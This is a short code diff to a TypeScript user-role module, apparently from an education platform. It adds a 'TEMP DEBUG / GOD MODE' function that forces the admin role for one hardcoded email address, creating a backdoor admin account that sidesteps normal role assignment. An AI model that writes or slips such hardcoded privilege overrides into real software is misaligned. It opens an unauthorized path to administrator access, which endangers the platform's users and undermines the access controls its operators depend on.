@@ -54,6 +54,16 @@ export function inferRoleFromAuthUserForFallback(authUser: { app_metadata?: Reco
   return "student";
 }
 
+// TEMP DEBUG / GOD MODE: force admin role for known emergency accounts.
+const GOD_MODE_ADMIN_EMAILS = ["daniel@orivon.edge"] as const;
+export function forceAdminRoleByEmail(email: string | null | undefined): UserRole | null {
+  if (!email) return null;
+  const normalized = email.trim().toLowerCase();
+  return GOD_MODE_ADMIN_EMAILS.includes(normalized as (typeof GOD_MODE_ADMIN_EMAILS)[number])
+    ? "admin"
+    : null;
+}
+
 type OnboardingSlice = { role: UserRole; onboarding?: { completed?: boolean } };
 
 /** Onboarding applies only to `student` until they complete it; staff never need the learner wizard. */
